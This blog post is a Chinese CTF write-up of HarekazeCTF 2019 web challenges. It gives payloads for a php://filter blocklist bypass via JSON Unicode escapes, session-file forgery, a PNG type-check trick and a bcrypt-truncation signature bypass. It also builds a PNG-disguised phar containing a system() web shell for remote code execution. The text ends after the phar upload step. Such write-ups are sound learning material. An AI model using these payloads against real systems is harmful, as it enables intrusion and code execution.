<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="ctf"><meta name="keywords" content="Harekaze ctf"><meta name="author" content="Somnus"><meta name="copyright" content="Somnus"><title>2019 HarekazeCTF-Web部分复现WriteUp | Somnus's blog</title><link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  }
} </script></head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#encode-and-encode"><span class="toc-number">1.</span> <span class="toc-text">encode_and_encode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Easy-Notes"><span class="toc-number">2.</span> <span class="toc-text">Easy Notes</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Avatar-Uploader-1"><span class="toc-number">3.</span> <span class="toc-text">Avatar Uploader 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Avatar-Uploader-2"><span class="toc-number">4.</span> <span class="toc-text">Avatar Uploader 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Sqlite-Voting"><span class="toc-number">5.</span> <span class="toc-text">Sqlite Voting</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#（1）寻找报错点"><span class="toc-number">5.1.</span> <span class="toc-text">（1）寻找报错点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#（2）构造条件语句"><span class="toc-number">5.2.</span> <span class="toc-text">（2）构造条件语句</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#（3）盲注长度"><span class="toc-number">5.3.</span> <span class="toc-text">（3）盲注长度</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#（4）盲注flag"><span class="toc-number">5.4.</span> <span class="toc-text">（4）盲注flag</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考"><span class="toc-number">6.</span> <span class="toc-text">参考</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">Somnus</div><div class="author-info__description text-center">与其哀叹，不如埋头苦干</div><div class="follow-button"><a href="https://Nikoeurus.github.io">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">96</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">46</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">26</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" href="https://mochazz.github.io" target="_blank" rel="noopener">七月火</a><a class="author-info-links__name text-center" href="https://zhzhdoai.github.io" target="_blank" rel="noopener">osword</a><a class="author-info-links__name text-center" href="https://glotozz.github.io/" target="_blank" rel="noopener">glotozz</a><a class="author-info-links__name text-center" href="http://dkk.ink" target="_blank" rel="noopener">dkk</a><a class="author-info-links__name text-center" href="https://www.virtua1.cn/" target="_blank" rel="noopener">Virtua1</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(/img/background.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Somnus's blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">2019 HarekazeCTF-Web部分复现WriteUp</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-11-07</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/ctf/">ctf</a></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>复现环境：<a href="https://buuoj.cn/" target="_blank" rel="noopener">https://buuoj.cn</a> <a id="more"></a></p>
<h3 id="encode-and-encode"><a href="#encode-and-encode" class="headerlink" title="encode_and_encode"></a>encode_and_encode</h3><p>题目源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>])) &#123;</span><br><span class="line">  show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">  $banword = [</span><br><span class="line">    <span class="comment">// no path traversal</span></span><br><span class="line">    <span class="string">'\.\.'</span>,</span><br><span class="line">    <span class="comment">// no stream wrapper</span></span><br><span class="line">    <span class="string">'(php|file|glob|data|tp|zip|zlib|phar):'</span>,</span><br><span class="line">    <span class="comment">// no data exfiltration</span></span><br><span class="line">    <span class="string">'flag'</span></span><br><span class="line">  ];</span><br><span class="line">  $regexp = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $banword) . <span class="string">'/i'</span>;</span><br><span class="line">  <span class="keyword">if</span> (preg_match($regexp, $str)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$body = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">$json = json_decode($body, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_valid($body) &amp;&amp; <span class="keyword">isset</span>($json) &amp;&amp; <span class="keyword">isset</span>($json[<span class="string">'page'</span>])) &#123;</span><br><span class="line">  $page = $json[<span class="string">'page'</span>];</span><br><span class="line">  $content = file_get_contents($page);</span><br><span class="line">  <span class="keyword">if</span> (!$content || !is_valid($content)) &#123;</span><br><span class="line">    $content = <span class="string">"&lt;p&gt;not found&lt;/p&gt;\n"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  $content = <span class="string">'&lt;p&gt;invalid request&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// no data exfiltration!!!</span></span><br><span class="line">$content = preg_replace(<span class="string">'/HarekazeCTF\&#123;.+\&#125;/i'</span>, <span class="string">'HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;'</span>, $content);</span><br><span class="line"><span class="keyword">echo</span> json_encode([<span class="string">'content'</span> =&gt; $content]);</span><br></pre></td></tr></table></figure>

<p>代码有两处过滤点，过滤的函数<strong>is_valid</strong>，将关键字<strong>..</strong>，<strong>flag</strong>，和一些协议都做了黑名单检测</p>
<p>第一处过滤是检测通过<strong>file_get_contents</strong>函数读取<strong>php://input</strong>的内容</p>
<p>第二处过滤是检测通过<strong>file_get_contents</strong>函数读取前一处读取的内容进行<strong>json_decode</strong>函数处理后的<strong>page</strong>字段的内容</p>
<p>我们的最终目的肯定是要读取<strong>/flag</strong>，但是怎么绕过黑名单的检测呢，关键就在于<strong>json_decode</strong>这个函数，它可以接收<strong>Unicode</strong>编码后的字符，也就是说，假设，我们把字符<strong>a</strong>进行Unicode编码，即<strong>\u0061</strong></p>
<p>测试代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$body = <span class="string">'&#123;"page":"/fl\u0061g"&#125;'</span>;</span><br><span class="line">$a = json_decode($body,<span class="keyword">true</span>);</span><br><span class="line">var_dump($a[<span class="string">'page'</span>]);</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/hkctf/140.png" alt=""></p>
<p>可见，Unicode编码后的a也被正常解析成了字符<strong>a</strong></p>
<p>那么，我们就可以利用这一个特性，来首先绕过第一层的黑名单检测，payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;page&quot;:&quot;/fl\u0061g&quot;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/hkctf/141.png" alt=""></p>
<p>这里返回了<strong>not found</strong>而不是<strong>invalid request</strong>，说明第一层过滤是通过了的，那么考虑第二层过滤：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!$content || !is_valid($content)) &#123;</span><br><span class="line">    $content = <span class="string">"&lt;p&gt;not found&lt;/p&gt;\n"</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>为什么返回的是<strong>not found</strong>，我们确定了<strong>/flag</strong>文件是存在的，那么就是<strong>/flag</strong>文件中的内容包含了黑名单中的关键字<strong>flag</strong>，所以我们可以使用伪协议对其内容进行一次base64加密，同样的道理，对<strong>php:</strong>其中的字符进行<strong>Unicode</strong>编码即可</p>
<p>最终的payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;page&quot;:&quot;p\u0068p://filter/convert.base64-encode/resource=/fl\u0061g&quot;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/hkctf/142.png" alt=""></p>
<p>最后base64解码就得到flag</p>
<p><img src="../../../../img/hkctf/143.png" alt=""></p>
<h3 id="Easy-Notes"><a href="#Easy-Notes" class="headerlink" title="Easy Notes"></a>Easy Notes</h3><p>下载源码后审计</p>
<p>先看看得到flag.php中得到flag的条件：</p>
<p><img src="../../../../img/hkctf/159.png" alt=""></p>
<p>flag是在环境变量中，获得的条件是符合<strong>is_admin</strong>函数：</p>
<p><img src="../../../../img/hkctf/160.png" alt=""></p>
<p>要满足条件：<strong>$_SESSION[‘admin’] === true</strong></p>
<p>而通篇审计会发现，没有正常可以设置<strong>$_SESSION[‘admin’]</strong>的地方</p>
<p>值得注意的点只有两处：</p>
<p>（1）session存储路径被设置为了：<strong>/var/www/tmp</strong></p>
<p><img src="../../../../img/hkctf/161.png" alt=""></p>
<p><img src="../../../../img/hkctf/162.png" alt=""></p>
<p>（2）<strong>export.php</strong>文件中存在通过<strong>ZipArchive</strong>类写文件的操作：</p>
<p><img src="../../../../img/hkctf/163.png" alt=""></p>
<p>我们知道ZipArchive类不仅仅能写zip文件，同样能写其他后缀名的文件，并且，这里写入的文件名参数<strong>$path</strong>，我们是可以控制的</p>
<p><img src="../../../../img/hkctf/164.png" alt=""></p>
<p>所以思路就是通过<strong>ZipArchive</strong>来写Session文件，来改变<strong>$_SESSION[‘admin’]</strong>的值</p>
<p>如果我们传入<strong>type</strong>为点<strong>.</strong>，拼接后的<strong>filename</strong>末尾就为<strong>..</strong>，经过<strong>str_replace</strong>替换为空，就变成无后缀文件，再根据Session文件的命名规律，开头为<strong>sess_</strong></p>
<p>最后就剩下文件内容了，因为session存储形式<strong>session.serialize_handler</strong>默认为php，当 <strong>session.serialize_handler=php</strong> 时，session文件内容为： <code>name|s:7:&quot;mochazz&quot;;</code> </p>
<p>综上：</p>
<p>（1）登陆用户名：<strong>sess_</strong></p>
<p>（2）添加title：<strong>|b:1;admin|b:1;</strong></p>
<p><img src="../../../../img/hkctf/165.png" alt=""></p>
<p>（3）访问：<strong>export.php?type=.</strong> 写入session文件</p>
<p><img src="../../../../img/hkctf/166.png" alt=""></p>
<p>根据响应包返回的文件名：<strong>sess_-eee4a062946c8f83</strong>，判断此文件的session_id为：<strong>-eee4a062946c8f83</strong></p>
<p>（4）将session_id修改为<strong>-eee4a062946c8f83</strong>访问flag.php</p>
<p><img src="../../../../img/hkctf/167.png" alt=""></p>
<p>获得flag</p>
<h3 id="Avatar-Uploader-1"><a href="#Avatar-Uploader-1" class="headerlink" title="Avatar Uploader 1"></a>Avatar Uploader 1</h3><p>打开靶机，登陆任意用户名后是一个上传页面</p>
<p><img src="../../../../img/hkctf/191.png" alt=""></p>
<p>要求只能上传PNG格式的图片，图片大小小于256KB，且像素小于256px*256px</p>
<p>先试着正常上传一个符合要求的PNG图片</p>
<p><img src="../../../../img/hkctf/192.png" alt=""></p>
<p>给了图片路径，之后，修改文件名后缀和Content-type，发现都能上传成功，并且返回路径中的文件名都是随机数.png</p>
<p>猜测后台是根据<strong>getimagesize</strong>函数来判断文件像素和类型</p>
<p>题目还给了源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line">$finfo = finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line">$type = finfo_file($finfo, $_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line">finfo_close($finfo);</span><br><span class="line"><span class="keyword">if</span> (!in_array($type, [<span class="string">'image/png'</span>])) &#123;</span><br><span class="line">  error(<span class="string">'Uploaded file is not PNG format.'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// check file width/height</span></span><br><span class="line">$size = getimagesize($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line"><span class="keyword">if</span> ($size[<span class="number">0</span>] &gt; <span class="number">256</span> || $size[<span class="number">1</span>] &gt; <span class="number">256</span>) &#123;</span><br><span class="line">  error(<span class="string">'Uploaded image is too large.'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($size[<span class="number">2</span>] !== IMAGETYPE_PNG) &#123;</span><br><span class="line">  <span class="comment">// I hope this never happens...</span></span><br><span class="line">  error(<span class="string">'What happened...? OK, the flag for part 1 is: &lt;code&gt;'</span> . getenv(<span class="string">'FLAG1'</span>) . <span class="string">'&lt;/code&gt;'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>代码大致意思是：需要我们想办法上传一个PNG图片，使得图片经过<strong>finfo_file</strong>函数判断未png格式而经过<strong>getimagesize</strong>函数判断不为png格式</p>
<p>这就需要利用到一个trick：<strong>finfo_file</strong>函数可以识别png图片十六进制下的第一行，即：</p>
<p><img src="../../../../img/hkctf/193.png" alt=""></p>
<p>而<strong>getimagesize</strong>函数不行</p>
<p>测试代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$finfo = finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line">$type = finfo_file($finfo,$_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line">finfo_close($finfo);</span><br><span class="line">var_dump($type);</span><br><span class="line"></span><br><span class="line">$size = getimagesize($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line">var_dump($size);</span><br><span class="line">var_dump($size[<span class="number">2</span>] == IMAGETYPE_PNG);</span><br><span class="line"></span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>上传如上只有一行十六进制的图片头后，返回信息：</p>
<p><img src="../../../../img/hkctf/194.png" alt=""></p>
<p>可以发现，此时<strong>finfo_file</strong>函数能识别出为<strong>png</strong>，而<strong>getimagesize</strong>不行，返回了<strong>false</strong></p>
<p>最后上传该图片到题目，即可得到flag</p>
<p><img src="../../../../img/hkctf/195.png" alt=""></p>
<h3 id="Avatar-Uploader-2"><a href="#Avatar-Uploader-2" class="headerlink" title="Avatar Uploader 2"></a>Avatar Uploader 2</h3><p>这题源码跟上一题一样，需要我们找到第二个flag，源码中是没有给出直接的获取途径，需要我们自己审计找到漏洞</p>
<p>漏洞触发点：index.php第25行：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>($session-&gt;get(<span class="string">'theme'</span>, <span class="string">'light'</span>) . <span class="string">'.css'</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>存在LFI</p>
<p>比较特别的是，本题的session处理机制是自写的，源码在<strong>/lib/session.php</strong></p>
<p>首先是魔术方法<code>__construct</code>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($cookieName = <span class="string">'session'</span>, $secret = <span class="string">'secret'</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;data = [];</span><br><span class="line">    <span class="keyword">$this</span>-&gt;secret = $secret;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (array_key_exists($cookieName, $_COOKIE)) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">list</span>($data, $signature) = explode(<span class="string">'.'</span>, $_COOKIE[$cookieName]);</span><br><span class="line">        $data = urlsafe_base64_decode($data);</span><br><span class="line">        $signature = urlsafe_base64_decode($signature);</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;verify($data, $signature)) &#123;</span><br><span class="line">          <span class="keyword">$this</span>-&gt;data = json_decode($data, <span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;cookieName = $cookieName;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>把cookie中的<code>session</code>字段值取出，并以点号<code>.</code>为分隔符分割出<strong>data</strong>和<strong>signature</strong>部分，对应<strong>数据</strong>部分和<strong>签名</strong>部分</p>
<p>然后对<strong>data</strong>和<strong>signature</strong>进行<code>verify</code>验证：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">verify</span><span class="params">($string, $signature)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> password_verify(<span class="keyword">$this</span>-&gt;secret . $string, $signature);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>认证成功，就把<strong>data</strong>进行<strong>json_decode</strong>解码，获取data数据</p>
<p>至于：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isset</span><span class="params">($key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> array_key_exists($key, <span class="keyword">$this</span>-&gt;data);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($key, $defaultValue = null)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;isset($key)) &#123;</span><br><span class="line">      <span class="keyword">return</span> $defaultValue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$key];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span><span class="params">($key, $value)</span></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;data[$key] = $value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unset</span><span class="params">($key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;data[$key]);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p><code>isset</code> 中判断参数 <code>$key</code> 是否在 <code>data</code> 中，<code>get</code> 中返回 <code>data</code> 中 <code>key</code> 为参数 <code>$key</code> 的数据，<code>set</code> 中将 <code>data</code> 中 <code>key</code> 为参数 <code>$key</code> 的数据设置为参数 <code>$value</code>，<code>unset</code> 中删除 <code>data</code> 中 <code>key</code> 为参数 <code>$key</code> 的数据 </p>
<p>比较重要的是<code>save</code>和<code>sign</code>函数：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $json = json_encode(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    $value = urlsafe_base64_encode($json) . <span class="string">'.'</span> . urlsafe_base64_encode(<span class="keyword">$this</span>-&gt;sign($json));</span><br><span class="line">    setcookie(<span class="keyword">$this</span>-&gt;cookieName, $value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sign</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> password_hash(<span class="keyword">$this</span>-&gt;secret . $string, PASSWORD_BCRYPT);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>sign</strong>函数用来产生签名，和data数据段通过点号<code>.</code>连接后base64加密最后生成cookie</p>
<p>了解了session的处理机制，我们再回到<strong>index.php</strong>的漏洞触发点：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>($session-&gt;get(<span class="string">'theme'</span>, <span class="string">'light'</span>) . <span class="string">'.css'</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>前面分析我们已经知道<strong>get</strong>方法是取出session中<strong>data</strong>的<strong>theme</strong>字段，并且，我们也了解了session的产生是通过<strong>save</strong>函数，因此我们就可以考虑去修改session字段，进而触发LFI</p>
<p>但是首先，我们得通过<strong>verify</strong>的签名校验，这就需要利用<strong>sign</strong>函数中使用的<strong>password_hash</strong>函数的特点：它的第一个参数不能超过 72 个字符 </p>
<p><img src="../../../../img/hkctf/196.png" alt=""></p>
<p><img src="../../../../img/hkctf/197.png" alt=""></p>
<p>也就是说，如果我们传入的第一个参数，即<code>$this-&gt;secret . $string</code>，<code>$string</code>对应<strong>data</strong>的<strong>json_encode</strong>部分，超过72个字符，那么72个以后的字符随意添加，产生的签名都是相同的，我们就可以利用这个特点来绕过<code>verify</code>的签名校验。所以我们只要找到一个点触发<strong>save</strong>函数，并且设置的cookie的data字段超过72个字符就行了</p>
<p>在upload.php的<strong>error</strong>方法，就符合我们的要求：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!file_exists($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]) || !is_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>])) &#123;</span><br><span class="line">  error(<span class="string">'No file was uploaded.'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>utils.php：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">flash</span><span class="params">($type, $message)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">global</span> $session;</span><br><span class="line">  $session-&gt;set(<span class="string">'flash'</span>, [</span><br><span class="line">    <span class="string">'type'</span> =&gt; $type,</span><br><span class="line">    <span class="string">'message'</span> =&gt; $message</span><br><span class="line">  ]);</span><br><span class="line">  $session-&gt;save();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">error</span><span class="params">($message, $path = <span class="string">'/'</span>)</span> </span>&#123;</span><br><span class="line">  flash(<span class="string">'error'</span>, $message);</span><br><span class="line">  redirect($path);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后就是思考，如何利用LFI，他包含的文件末尾后缀为<code>.css</code>，这就想到了<strong>phar</strong>协议，我们在phar文件中，复合一个带有马的<strong>exp.css</strong>文件，然后改变<strong>theme</strong>字段值为：<code>phar://uploads/xxxxxx.png/exp</code>，成功包含后就可以实现rce了</p>
<p>（1）编写phar文件POC：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$png_header = hex2bin(<span class="string">'89504e470d0a1a0a0000000d49484452000000400000004000'</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'exp.phar'</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;addFromString(<span class="string">'exp.css'</span>, <span class="string">'&lt;?php system($_GET["cmd"]); ?&gt;'</span>);</span><br><span class="line">$phar-&gt;setStub($png_header . <span class="string">'&lt;?php __HALT_COMPILER(); ?&gt;'</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>

<p>这里要注意设置phar的头部为png格式，且要符合要求（小于256<em>256），在其中复合*</em>exp.css**的一句话马</p>
<p>（2）登陆一个账号后，直接上传POC生成的<strong>exp.phar</strong></p>
<p><img src="../../../../img/hkctf/198.png" alt=""></p>
